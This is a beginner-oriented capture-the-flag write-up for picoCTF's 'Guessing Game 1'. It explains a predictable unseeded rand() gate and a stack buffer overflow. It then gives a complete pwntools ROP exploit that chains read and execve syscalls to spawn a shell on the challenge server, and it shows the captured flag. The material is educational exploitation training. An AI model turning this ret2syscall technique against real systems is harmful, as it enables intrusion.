Guessing Game 1 - A Detailed CTF Writeup for Beginners
Challenge: Guessing Game 1
Author: madStacks
Category: Binary Exploitation
Difficulty: Medium
Table of Contents
Challenge Overview
Initial Reconnaissance
Deep Dive into the Source Code (vuln.c)
The main() Function: The Program's Engine
The do_stuff() Function: The Gatekeeper and Vulnerability #1
The win() Function: The Real Target and Vulnerability #2
From C to Assembly: Understanding the Stack and Finding the Offset
A Quick Primer on the Stack
Analyzing the win() Function Disassembly
Calculating the Exact Offset
The Attacker's Mindset: Formulating an Exploit Plan
Beginner's Corner: Answering Your Core Questions
What is a Gadget and Why Do We Need It?
What is a Syscall? Where do the read() and execve() Stages Come From?
Step-by-Step Exploit Construction
Step 1: Finding the Lucky Number with GDB
Step 2: Verifying the Overflow Offset
Step 3: Finding ROP Gadgets and Memory Addresses
Step 4: Writing the Final Exploit Script (Line by Line)
Executing the Exploit and Getting the Flag
Key Takeaways and Conclusion
Appendix: Quick Reference
1. Challenge Overview
The challenge provides a 64-bit Linux executable (vuln) and its C source code (vuln.c). It's a command-line number guessing game. The objective is to find and exploit vulnerabilities within this program to gain remote code execution (a shell) on the server and retrieve the flag.
Challenge Description:
I made a simple game to show off my programming skills. See if you can beat it!
2. Initial Reconnaissance
Before touching the code, we perform basic checks on the binary to understand its properties.
File Information
code
Bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, ... statically linked, ... not stripped
ELF 64-bit LSB executable, x86-64: A standard 64-bit Linux program.
statically linked: This is a major clue. All necessary library code is included directly in the binary. This means common techniques like ret2libc (reusing functions from the standard C library) are impossible. Our entire exploit must be constructed from code found only within the vuln file itself.
not stripped: The binary contains function names and symbols, making it much easier to analyze in tools like GDB and Ghidra.
Security Protections
code
Bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
NX enabled (No-eXecute): This is the most important security feature here. It marks the program's stack as non-executable memory. We cannot simply inject our own malicious machine code (shellcode) onto the stack and jump to it. This security measure forces us to use a code-reuse attack like Return-Oriented Programming (ROP).
No PIE (Position-Independent Executable): This makes our job easier. The addresses of all functions and data within the binary are fixed and will be the same every time the program runs. We don't need to find an information leak to calculate our target addresses.
Canary found: This protection places a random value on the stack to detect buffer overflows. However, it's common for challenge authors to disable canaries for the specific function they intend to be vulnerable. We will see that the win() function is not protected.
3. Deep Dive into the Source Code (vuln.c)
The source code reveals the program's logic and vulnerabilities clearly.
The main() Function: The Program's Engine
code
C
int main(int argc, char **argv){
    // ... setup ...
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	return 0;
}
The program's core is an infinite loop. It repeatedly calls do_stuff(). If do_stuff() returns a true value (i.e., not zero), it then calls win(). Our first goal is to make do_stuff() return true.
The do_stuff() Function: The Gatekeeper and Vulnerability #1
code
C
long get_random() {
	return rand() % BUFSIZE; // BUFSIZE is 100
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans); // Adds 1
	// ... code to get user guess `g` ...
	if (g == ans) {
		printf("Congrats! You win! ...\n");
		res = 1; // This is our goal!
	}
	// ...
	return res;
}
This function contains our first vulnerability.
Vulnerability #1: Predictable Pseudorandom Number: The rand() function is used to generate the correct answer. However, the program never calls srand() to provide a seed (like the current time). When an unseeded C program uses rand(), it produces the exact same sequence of numbers every single time it is run. The "random" number is therefore a constant, predictable value that we can easily find.
The win() Function: The Real Target and Vulnerability #2
code
C
#define BUFSIZE 100

void win() {
	char winner[BUFSIZE]; // 100-byte buffer on the stack
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin); // Reads up to 360 bytes!
	printf("Congrats %s\n\n", winner);
}
This is where the critical vulnerability lies.
Vulnerability #2: Stack-Based Buffer Overflow: A character array winner is allocated on the stack with a size of 100 bytes. However, the fgets() function is instructed to read up to 360 bytes into it. This allows us to write far beyond the buffer's boundary, overwriting crucial data on the stack, including the saved return address. By controlling this address, we can hijack the program's execution flow and make it jump wherever we want.
4. From C to Assembly: Understanding the Stack and Finding the Offset
To exploit the buffer overflow, we need to know the exact number of bytes to send to overwrite the return address.
A Quick Primer on the Stack
The stack is a region of memory that functions grow into. When main() calls win(), the stack looks like this:
code
Code
High Memory Addresses
+-----------------------------+
| Return Address (in main)    | <--- Our Target to Overwrite
+-----------------------------+
| Saved RBP (from main)       |
+-----------------------------+ <--- RBP for win() points here
| ... local variables ...     |
| (char winner[100])          | <--- Our buffer starts here
+-----------------------------+ <--- RSP for win() points here
      Low Memory Addresses
Analyzing the win() Function Disassembly
The assembly code from Ghidra or GDB confirms the stack layout.
code
Assembly
// win():
00400c51  MOV    RBP,RSP          ; The base of the stack frame is set
00400c54  SUB    RSP,0x70         ; 0x70 (112) bytes are allocated for local variables
...
00400c70  LEA    RAX,[RBP-0x70]   ; The address of our buffer is calculated as RBP-0x70
00400c74  MOV    ESI,0x168        ; 0x168 (360) is the size for fgets
This tells us the winner buffer starts 112 bytes (0x70) below the base pointer (RBP).
Calculating the Exact Offset
Distance from buffer to RBP: The buffer starts at RBP - 0x70. So, it takes 0x70 (112) bytes of data to fill from the start of the buffer up to the location pointed to by RBP.
Distance from RBP to the Return Address: The saved RBP takes up 8 bytes. The return address is stored immediately after it. So, it takes another 8 bytes to get past the saved RBP.
Total Offset: 112 bytes (buffer) + 8 bytes (saved RBP) = 120 bytes.
We need to send 120 bytes of junk/padding before we can overwrite the return address.
5. The Attacker's Mindset: Formulating an Exploit Plan
We have all the pieces. Now we formulate a plan:
Bypass the Gate: We will find the static "random" number and send it to the program. This will make do_stuff() return 1 and call win().
Prepare the Attack: We know we can control the return address.
Problem: NX enabled means we can't run our own code from the stack.
Solution: We must use Return-Oriented Programming (ROP) to chain together existing pieces of code (gadgets) from the binary.
Goal: We want to get a shell. The most direct way is to ask the Kernel to run /bin/sh for us using an execve syscall.
New Problem: The string "/bin/sh" doesn't exist anywhere in the binary's memory.
Final Solution: A Two-Stage ROP Chain.
Stage 1: Craft a ROP chain to make a read syscall. This will read the string "/bin/sh" from our own input and write it into a known, writable part of the program's memory (the .bss section).
Stage 2: Craft a second ROP chain that executes immediately after the first. This chain will make an execve syscall, pointing to the address in .bss where we just wrote our string. This will pop a shell.
6. Beginner's Corner: Answering Your Core Questions
Q1: What is a Gadget and Why Do We Need It?
A gadget is a small, useful sequence of machine instructions (like pop rdi; ret) that already exists inside the program's code. The ret instruction at the end is what makes it a "gadget" because it allows us to chain them together. ROPgadget is a tool that finds these for us.
We need them because NX is enabled.
NX (No-eXecute) prevents code on the stack from being executed.
This means we cannot simply write our own malicious code (shellcode) into the buffer and jump to it.
ROP is the workaround. If we can't introduce new code, we must re-use the code that's already there.
By overflowing the stack, we replace the single return address with a list of many addresses, each pointing to a gadget. The program executes the first gadget, hits the ret, and "returns" to the second gadget address we supplied. It executes the second gadget, hits ret, and jumps to the third, and so on. We are building a new program out of the scattered Lego bricks of the original.
Q2: What is a Syscall? Where do the read() and execve() Stages Come From?
These stages do not exist in the C code. They are not functions we are calling. We are manually building requests to the Linux Kernel.
A syscall is how a regular program asks the powerful OS Kernel to do something for it. To make a syscall, a program follows a strict recipe:
Put specific arguments into specific CPU registers (e.g., RDI, RSI, RDX).
Put the unique "service number" for the desired action into the RAX register (0 for read, 59 for execve).
Execute the syscall instruction.
Our ROP chain is simply a step-by-step automation of this recipe.
Stage 1 uses gadgets to set RAX=0, RDI=0, etc., and then jumps to a syscall instruction. This constructs a read request.
Stage 2 uses more gadgets to set RAX=59, RDI=address_of_"/bin/sh", etc., and then jumps to another syscall instruction. This constructs an execve request.
The stages "suddenly appear" because our payload hijacks the CPU and forces it to make these requests that the original programmer never intended.
7. Step-by-Step Exploit Construction
Step 1: Finding the Lucky Number with GDB
We run the binary in a debugger to find the value of ans.
code
Bash
$ gdb ./vuln
(gdb) b *do_stuff+29  # Break after the number is calculated
(gdb) r
(gdb) ni              # Step over one instruction
(gdb) p $rax          # Print the result
$1 = 84
The number to guess is 84.
Step 2: Verifying the Overflow Offset
We use a cyclic pattern to confirm our 120-byte offset calculation.
code
Bash
$ gdb ./vuln
(gdb) cyclic 200
... (copy pattern) ...
(gdb) r
> 84
> (paste pattern)
... Program crashes ...
(gdb) cyclic -l <value_in_rip>
120
The offset is confirmed to be 120.
Step 3: Finding ROP Gadgets and Memory Addresses
Using ROPgadget and readelf, we find the necessary addresses:
code
Bash
# Find gadget addresses with ROPgadget
$ ROPgadget --binary ./vuln --only "pop rax|pop rdi|pop rsi|pop rdx|syscall"
...
0x004005af : pop rax ; ret
0x004006a6 : pop rdi ; ret
0x00410b93 : pop rsi ; ret
0x00410602 : pop rdx ; ret
0x0040138c : syscall
...
# We also find a more useful gadget for Stage 1:
0x0044a3ea : xor rax, rax ; syscall

# Find a writable address with readelf or pwntools
$ python3 -c "from pwn import *; elf=ELF('./vuln'); print(hex(elf.bss()))"
0x6bc3a0
Step 4: Writing the Final Exploit Script (Line by Line)
We use pwntools in Python to automate the entire process.
code
Python
from pwn import *

# 1. Setup: Load the binary and connect to the remote server.
elf = context.binary = ELF('./vuln', checksec=False)
r = remote('shape-facility.picoctf.net', 58723)

# 2. Bypass the Gate: Send the correct number to enter the win() function.
r.sendlineafter(b'guess?', b'84')

# 3. Define Constants: Store our offset and gadget addresses for clarity.
offset = 120
rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
xor_rax_syscall = 0x000000000044a3ea # xor rax, rax; syscall
bss_addr = elf.bss() + 0x200         # A safe, writable address

# 4. Build the Payload
payload = b'A' * offset  # Junk padding to reach the return address

# --- STAGE 1 ROP CHAIN: Call read(0, bss_addr, 8) ---
# This chain reads "/bin/sh\x00" from our input and writes it to memory.
payload += p64(pop_rdi)          # Set up the first argument for read()
payload += p64(0)                # RDI = 0 (file descriptor for stdin)
payload += p64(pop_rsi)          # Set up the second argument
payload += p64(bss_addr)         # RSI = destination buffer address
payload += p64(pop_rdx)          # Set up the third argument
payload += p64(8)                # RDX = 8 bytes to read ("/bin/sh\x00")
payload += p64(xor_rax_syscall)  # Sets RAX=0 and makes the syscall for read()

# --- STAGE 2 ROP CHAIN: Call execve(bss_addr, 0, 0) ---
# This chain executes the string we just wrote to memory.
payload += p64(pop_rdi)          # Set up the first argument for execve()
payload += p64(bss_addr)         # RDI = pointer to our "/bin/sh" string
payload += p64(pop_rsi)          # Set up the second argument
payload += p64(0)                # RSI = 0 (argv = NULL)
payload += p64(pop_rdx)          # Set up the third argument
payload += p64(0)                # RDX = 0 (envp = NULL)
payload += p64(pop_rax)          # Set up the syscall number
payload += p64(59)               # RAX = 59 (syscall number for execve)
payload += p64(syscall)          # Trigger the final syscall

# The binary's fgets reads up to 360 bytes. We pad our payload to avoid issues.
payload += b'A' * (359 - len(payload))

# 5. Send the Payload: This triggers the buffer overflow.
r.sendlineafter(b'Name?', payload)

# 6. Send the String: The program's ROP chain is now executing read(), waiting for input.
# We provide the string it needs.
r.sendline(b'/bin/sh\x00')

# 7. Get the Shell: The ROP chain continues to Stage 2 and pops a shell.
r.interactive()
8. Executing the Exploit and Getting the Flag
Running the script gives us an interactive shell on the remote server, where we can find and read the flag.
code
Bash
$ python3 solve.py
[+] Opening connection... Done
[*] Switching to interactive mode
$ ls
flag.txt vuln vuln.c ...
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}
9. Key Takeaways and Conclusion
This challenge is a fantastic introduction to modern binary exploitation concepts.
Vulnerability Chaining: A simple, predictable PRNG was used as a gate to a more severe buffer overflow vulnerability.
Code Reuse Attacks (ROP): When NX is enabled, you cannot inject code. You must learn to re-use existing code snippets (gadgets) to build your attack.
ret2syscall: When a binary is statically linked, ret2syscall is a powerful technique. Instead of calling functions within the binary, you manually build requests to the underlying operating system to perform powerful actions.
Problem Solving in Exploitation: The inability to find "/bin/sh" in memory is a common problem. The two-stage solution (using read to write the string first) is a standard and essential technique to learn.
10. Appendix: Quick Reference
Syscall Calling Convention (x86-64 Linux)
Syscall Number / Return	Arg 1	Arg 2	Arg 3
RAX	RDI	RSI	RDX
Key GDB Commands
b *<address>: Set a breakpoint.
r: Run the program.
ni: Step to the next instruction.
p $register: Print a register's value.
x/s <address>: Examine memory as a string.
x/i $pc: Disassemble the current instruction.
Key Pwntools Functions
ELF('./path'): Load a binary for analysis.
remote('host', port): Connect to a remote service.
r.sendlineafter(b'prompt', b'data'): Wait for a prompt, then send data.
p64(value): Pack an integer into a 64-bit (8-byte) little-endian bytestring.
ROP(elf): Initialize the ROP tool.
rop.find_gadget([...]): Search for gadgets.
r.interactive(): Pass control to the user for shell interaction.
